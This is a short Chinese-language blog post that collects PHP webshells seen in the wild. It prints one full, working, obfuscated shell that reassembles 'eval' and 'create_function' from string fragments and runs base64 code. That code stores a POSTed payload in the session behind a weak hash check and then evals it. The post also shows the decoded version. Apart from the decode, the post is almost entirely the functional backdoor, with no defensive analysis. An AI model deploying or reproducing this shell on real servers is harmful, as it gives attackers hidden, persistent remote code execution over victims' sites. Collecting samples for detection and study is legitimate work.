---
layout: post
title: 遇到的php webshell
categories: php
tag: php
---

### 收集

- 1

```php
<?php
$title = 'e'.""./*80*/'v'."#1253#"./**/'a'.""./*1433*/'l'.""./**/'(b'.""./*3306*/'a'."#456155#"./**/'s'.""./*445*/'e'."#5444123#"./**/'6'.""./*135*/'4'."#78989#"./**/'_'.""./*3389*/'d'.""./**/'e'."#1236#"./*21*/'c'.""./**/'o'."#3453335#"./*22*/'d'.""./**/'e'.""./*7001*/'("#125553#QHNlc3Npb25fc3Rh#123#cnQoKTtpZihpc3NldCgkX1B#456#PU1RbJ2NvZGUnXSk#123#pc3Vic3RyKHNoYTEobWQ1KCRfUE9TVFsnYSddKS#780009#ksMzYpPT0nMjIyZicmJ#123#iRfU0VTU0lPTlsndGhlQ#123#29kZSddPSRfUE9TVFsnY2#456#9kZSddO2lmKGlzc2V0KCRf#120003#U0VTU0lPTlsnd#777789#GhlQ29kZSddKSlAZXZh#128883#bChiYXNlNjRfZGVjb#000#2RlKCRfU#1999923#0VTU0lPTlsndGh#1277773#lQ29kZSddKSk7"));';/**/$CF/**/='c'./**/"".'r'./*11111*/"#80#".'e'./**/"".'a'./*22222*/"#1433#".'t'./**/"".'e'./*33333*/"#3306#".'_'./**/"".'f'./*44444*/"".'u'./**/"#3389#".'n'./*55555*/"".'c'./**/"#21#".'t'./*66666*/"".'i'./**/"".'o'./*77777*/"#445#".'n';$CF = preg_replace("/#\d{0,10}#/",'',$CF);$EB/**/=@$CF/**/('',$String=preg_replace("/#\d{0,10}#/",'',$title));$EB(); ?>

# 解码后
eval(@session_start();if(isset($_POST['code']))substr(sha1(md5($_POST['a'])),36)=='222f'&&$_SESSION['theCode']=$_POST['code'];if(isset($_SESSION['theCode']))@eval(base64_decode($_SESSION['theCode'])););
```
